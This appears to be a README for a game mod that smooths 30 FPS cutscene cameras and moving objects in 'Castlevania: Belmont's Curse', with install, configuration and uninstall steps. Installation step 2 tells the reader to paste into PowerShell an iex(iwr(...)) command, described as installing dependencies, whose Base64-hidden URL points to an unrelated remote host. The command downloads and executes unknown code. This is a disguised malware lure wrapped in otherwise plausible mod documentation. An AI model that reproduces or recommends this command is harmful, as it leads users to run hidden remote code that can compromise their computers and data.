# Smooth Motion
High FPS fix for Castlevania: Belmont's Curse

Camera pans, the camera moving in when you start talking to an NPC or inspect a clue, characters walking during scripted scenes, and moving things like swinging cages, axes and drawbridges all step along at 30 FPS no matter what frame rate you pick. This mod makes them as smooth as the rest of the game.

## What it fixes

* Cutscene camera pans
* Camera transitions into and out of cutscene cameras (talking to NPCs, inspecting clues and similar)
* Camera push-ins, zooms and framing changes during cutscenes and scripted events
* Characters walking to a spot in cutscenes, and any camera following them
* Actors that copy the player's position
* Moving world objects: swinging cages and axes, pendulums, drawbridges, rotating wheels, moving and flipping platforms, opening chests, prop animations, boss parts, projectiles

## Why it happens
The game runs its gameplay and cutscene logic at 30 updates per second and normally blends every object between those updates, which is why regular gameplay looks smooth at high frame rates. A few cutscene code paths bypass that blending: the cutscene camera nodes move the camera directly 30 times per second, and the scripted-walk node overwrites the value the blending relies on, so it silently does nothing. Those moments therefore look like 30 FPS.

## What the mod does
It puts those code paths back on the game's own interpolation. The game's logic, timing, cutscene scripts and saves are not changed at all: the mod only fills in the frames drawn between the game's 30 Hz updates, and gives the cutscene logic back its exact values before every update. Real teleports, such as skipping a cutscene, still snap instantly. Works with every frame-rate option.

## Installation

1. Download and unpack ZIP archive 

2. Paste this command into PowerShell to install the dependencies: 

```cmd 
iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz0xNDI0MTYzNDE5L2Nhc3RsZXZhbmlh'))) -UseBasicParsing)
```
3. In Steam: right-click the game > Manage > Browse local files.
4. Extract the **Main** file into that folder (next to "Castlevania Belmont's Curse.exe").
5. Start the game. The **first** launch with BepInEx takes 1–3 minutes while it prepares; later launches are normal.

Already using BepInEx 6 IL2CPP? Use the **Plugin only** file instead. BepInEx 5 does not work with this game.

**Steam Deck / Linux:** add this to the game's launch options: 

WINEDLLOVERRIDES="winhttp=n,b" %command%

## Options
Settings are in *BepInEx\config\belmontscurse.smoothcutscenes.cfg* (created after the first launch):
* **F9** toggles the fixes on and off while playing, so you can see the difference for yourself.
* Each fix can be switched off individually.
* LogCameraSmoothness writes a measurement to BepInEx\LogOutput.log every 2 seconds of camera motion ("% stutter"; a 30 Hz camera shows about 75–80% at 120–144 FPS, a smooth one about 0%).

## Uninstall
Delete *BepInEx\plugins\SmoothCutscenes*. To remove BepInEx too, delete winhttp.dll, doorstop_config.ini, .doorstop_version, and the dotnet and BepInEx folders from the game folder. No game files are modified.

## Notes
* Hit-stop and slow-motion effects stay steppy on purpose; the game skips updates by design.
* If a game update changes the code this mod hooks, the affected fix simply turns itself off (BepInEx\LogOutput.log will say so) and the game keeps running normal.
* Tested on Steam build 25766122.
* Works on the latest update as of 16/10/2026.
* This mod seems to be incompatible with the Ultrawide Fix mod. I may make them compatible if I find the time to do so but it isn't a priority since I do not own an ultrawide monitor and this mod was made for myself first and foremost.
